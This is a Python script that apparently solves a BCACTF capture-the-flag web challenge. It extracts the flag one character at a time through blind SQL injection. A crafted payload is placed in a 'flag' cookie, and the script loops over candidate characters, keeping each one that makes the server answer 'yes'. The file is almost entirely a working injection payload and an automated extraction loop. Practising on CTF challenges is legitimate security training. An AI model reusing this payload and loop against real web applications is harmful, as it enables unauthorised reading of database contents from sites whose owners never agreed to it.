import readline
import requests as rq
from string import ascii_lowercase, digits, punctuation

url = 'http://web.bcactf.com:49213'
#flag = 'bcactf{you_didnt_see_that_coming_q_ujtvr_q_zt_'
#flag = 'bcactf{you_didnt_see_that_coming'
flag = 'bcactf{you_didnt_see_that_coming_q7ujtvr'


def sqli(c):
    cmd = flag + c
    cookie = {
        'flag': f"' or flag like \"{cmd}%\" /*"
    }
    res = rq.get(url, cookies=cookie).text
    print(cmd, res)
    return res


l = ''.join([x for x in ascii_lowercase+digits +
            '{}!@#$^&*()-=+,.<>?_' if x != '%'])
for _ in range(40):
    for c in l:
        #cmd = input('sqli> ')
        res = sqli(c)
        if 'yes' in res:
            flag += c
            break

print(flag)
